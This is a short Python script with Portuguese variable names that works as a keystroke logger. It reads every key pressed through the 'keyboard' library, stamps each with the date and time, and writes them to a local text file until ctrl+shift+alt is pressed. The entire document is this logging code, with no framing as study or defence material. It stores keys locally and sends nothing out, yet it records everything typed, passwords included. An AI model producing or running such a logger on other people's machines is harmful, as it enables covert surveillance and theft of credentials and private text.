import keyboard
from datetime import datetime
from time import sleep

with open("teclasClicadas.txt", "w") as arquivo:
    for caractere in range(0, 1000000000):

        teclas = keyboard.read_key()
        sleep(0.135)
        data_completa = str(datetime.now())
        log_teclas = data_completa + " -- " + teclas
        arquivo.write(log_teclas + "\n")
        parar_algoritmo = keyboard.is_pressed("ctrl+shift+alt")
        if (parar_algoritmo == True):
            break